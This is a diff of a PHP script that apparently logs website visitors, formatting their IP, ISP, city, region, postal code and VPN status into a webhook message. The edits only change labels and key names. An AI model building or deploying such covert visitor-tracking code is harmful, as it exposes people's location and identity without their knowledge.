@@ -40,13 +40,13 @@
         if($vpnCon->connection_type==="Corporate"){
 
 
-            $vpn = "Yes (Double Again: $details->isp)";
+            $vpn = "Yes (Check Again: $details->isp)";
 
 
         }else{
 
 
-            $vpn = "No (Double Again: $details->isp)";
+            $vpn = "No (Check Again: $details->isp)";
 
 
         }
@@ -55,11 +55,11 @@
         $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
 
 
-        $data = "**IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**IsVPN?** $vpn  (Possible False-Postives)";
+        $data = "#IP:# $ip\n#ISP:# $details->isp\n#Date:# $TheirDate\n#Time:# $TheirTime \n#GeoLocation:# $details->city \n#Region:# $details->region\n#Country# $details->country\n#Postal Code:# $details->zip\n#IsVPN?# $vpn  (Possible False Postive)";
 
 
 
-        $json_data = array ('content'=>"$data", 'username'=>"Visited From: $details->country", 'avatar_url'=> "$flag");
+        $json_data = array ('content'=>"$data", 'Username'=>"Visited From: $details->country", 'Avatar_url'=> "$flag");
 
 
         $make_json = json_encode($json_data);
